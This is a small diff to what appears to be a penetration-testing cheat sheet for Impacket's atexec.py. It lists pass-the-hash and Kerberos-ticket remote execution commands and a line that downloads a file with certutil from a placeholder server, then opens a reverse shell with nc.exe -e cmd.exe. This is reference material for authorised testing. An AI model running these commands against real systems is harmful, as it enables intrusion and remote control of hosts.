@@ -23,5 +23,5 @@ atexec.py -debug -hashes :<nt_hash>  <domain_fqdn>/<user>@<target_fqdn> <cmd>
 ## execute (ptt)
 certutil.exe -urlcache -split -f http://<server>/<source_file> <dest_file>; nc.exe <ip> <port> -e cmd.exe>
 ```bash
-KRB5CCNAME=<ccache> atexec.py -no-pass -k <target_fqdn> <cmd></cmd>
+KRB5CCNAME=<ccache> atexec.py -no-pass -k <target_fqdn> <cmd>
 ```
